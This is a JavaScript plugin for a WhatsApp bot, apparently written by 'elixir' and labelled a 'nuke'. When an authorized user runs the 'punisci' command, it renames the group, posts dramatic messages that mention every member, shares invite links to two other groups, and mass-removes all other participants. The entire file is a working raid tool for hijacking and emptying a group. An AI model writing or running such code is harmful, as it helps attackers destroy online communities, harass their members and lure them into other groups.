// Plug-in nuke creato da elixir
let handler = async (m, { conn, participants, isBotAdmin }) => {
    if (!m.isGroup) return;

    // --- SISTEMA DI SICUREZZA ELIXIR (Owner, Mods, Prems, Sam) ---
    const authList = [
        ...(global.owner || []),
        ...(global.mods || []),
        ...(global.prems || []),
        ...(global.sam || [])
    ];

    const authorizedJids = authList.map(o => {
        if (!o) return null;
        let raw = Array.isArray(o) ? o[0] : o;
        return raw ? raw.toString().replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;
    }).filter(jid => jid && jid !== '@s.whatsapp.net');

    if (!authorizedJids.includes(m.sender)) return;
    if (!isBotAdmin) return;

    const botId = (conn.user.id.split(':') || conn.user.id.split('@')) + '@s.whatsapp.net';

    // 🔹 CAMBIO NOME GRUPPO
    try {
        let metadata = await conn.groupMetadata(m.chat);
        let suffix = ' | ꜱᴠᴛ ʙʏ ᴛʜᴇ ᴘᴜɴɪꜱʜᴇʀ';
        if (!metadata.subject.includes(suffix)) {
            await conn.groupUpdateSubject(m.chat, `${metadata.subject}${suffix}`);
        }
    } catch (e) {}

    // 🔹 LINK DA INVIARE
    const links = "https://chat.whatsapp.com/KUZvFAnTAnqEmjXuPszt4n\nhttps://chat.whatsapp.com/Cdsvt0M8WKd1eobU1vNvsF";

    // 🔹 FILTRO RIMOZIONE
    let usersToRemove = participants
        .map(p => p.id || p.jid)
        .filter(jid => jid && jid !== botId && !authorizedJids.includes(jid));

    if (!usersToRemove.length) return;

    await conn.sendMessage(m.chat, { 
        text: "ɴᴇʟ ꜱɪʟᴇɴᴢɪᴏ ᴅᴇʟ ᴄɪᴇʟᴏ, ᴜɴᴀ ᴠᴏᴄᴇ ᴀɴᴛɪᴄᴀ ᴅᴇᴄʀᴇᴛò ɪʟ ɢɪᴜᴅɪᴢɪᴏ. ᴄᴏꜱì ʟᴀ ᴘᴜɴɪᴢɪᴏɴᴇ ᴅɪᴠɪɴᴀ ᴄᴀᴅᴅᴇ, ɪɴᴇᴠɪᴛᴀʙɪʟᴇ." 
    });

    await conn.sendMessage(m.chat, {
        text: `ᴍᴀ ᴛʀᴀ ʟᴇ ʀᴏᴠɪɴᴇ ɴᴀᴄQᴜᴇ ᴜɴ ꜱᴜꜱꜱᴜʀʀᴏ ᴅɪ ꜱᴘᴇʀᴀɴᴢᴀ. ᴄʜɪ ꜱᴇᴘᴘᴇ ᴄʜɪɴᴀʀᴇ ɪʟ ᴄᴀᴘᴏ ᴛʀᴏᴠò ᴜɴᴀ ᴠɪᴀ ᴅɪ ʀᴇᴅᴇɴᴢɪᴏɴᴇ.\n\n${links}`,
        mentions: participants.map(p => p.id || p.jid)
    });

    try {
        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
    } catch (e) {}
};

handler.command = ['punisci'];
handler.group = true;
handler.botAdmin = true;
handler.owner = true;
export default handler;
